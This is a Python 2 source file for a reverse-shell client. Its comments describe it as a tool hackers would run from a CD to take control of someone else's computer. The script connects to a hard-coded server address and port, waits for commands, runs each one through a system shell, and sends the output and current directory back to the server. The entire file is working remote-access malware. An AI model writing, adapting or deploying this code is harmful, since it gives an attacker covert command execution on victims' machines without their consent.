# Hackers would put on cd and run and connects to server

# Once running, connect to server, just wait for instructions
# Run commands, and send back output to server
# So controlling someone else's computer


import os  
import subprocess
import socket
import json

from subprocess import check_output


# To get home directory
from os.path import expanduser

def connectToServer():	
	s = socket.socket()         # Create a socket object
	#host = socket.gethostname() # IP Address of server
	host = '192.168.0.9' #confirmed is this: 192.168.0.12, temp for now: 192.168.0.9
	port = 9999                # Port of server
	print "Trying to connect to: {} at {}".format(host, port)
	s.connect((host, port))

	# Initially, send current working directory to server
	currentDir = os.getcwd()
	print "Sending working directory: {}".format(currentDir)
	s.sendall(currentDir)

	# Keep listening for instructions
	while True: 
		print "Waiting for command..."
		data = s.recv(1024)	# Receive command from server
		#print "\n\nraw cmd from server is: {}".format(data)
		data = json.loads(data)
		#print "formatted cmd from server is: {}".format(data)

		# Extract commands into separate words
		commandsWords = data.split()
		#print "commandsWords is: {}".format(commandsWords)

		# Other data to send back to client
		exception = ""
		commandOutput = ""
	
		# Handle case of changing directories separately
		# Done since using os.chdir here
		# Todo: Handle case of ~/whatever
		if commandsWords[0] == "cd":
			#print "\ncd commands\n"
			try:
				if commandsWords[1] == "~":
					home = expanduser("~")
					os.chdir(home)
				else:
					os.chdir(commandsWords[1])
			except Exception as e:
				print "Exception is: {}".format(e)
				exception = e

		# Other commands
		else:
			
			try:		
				# Todo: Find better way to get output of script rather than just saying tried
				# Todo: Cases of & at end or not to run script in background
				# Todo: Right now scripts can be run with nohup command

				# Pipes any output to standard stream				
				cmd = subprocess.Popen(data, shell = True, stdout=subprocess.PIPE, stderr = subprocess.PIPE, stdin = subprocess.PIPE)
				
				# Check if script or not
				lastArg = commandsWords[len(commandsWords) - 1]
				print "\ncommandsWords is: {}\n".format(lastArg)
				if lastArg[-3:] == ".sh":	# script, so just return string saying ran script
					print "Its a script"
					commandOutput = "Tried running the script."
				else: # Not script, so return output from running command
					print "Not a script"
					commandOutput = cmd.stdout.read() + cmd.stderr.read()
					print "commandOutput is: \n{}".format(commandOutput)

			except Exception as e:
				print "exception is: {}".format(e)
				exception = e

		# Get new current directory regardless of changed or not
		newDir = os.getcwd()
		#print "New working directory: {}".format(newDir)
		
		# Formatting data to send to client
		sendBack = {}
		sendBack["currentDir"] = newDir
		sendBack["exception"] = str(exception)
		sendBack["commandOutput"] = str(commandOutput)
		# print "sendBack is: {}".format(sendBack)
		
		sendBackFormatted = json.dumps(sendBack) #data serialized
		s.sendall(sendBackFormatted)
		
	s.close # Close the socket when done

# Example program
if __name__ == "__main__":
	connectToServer()
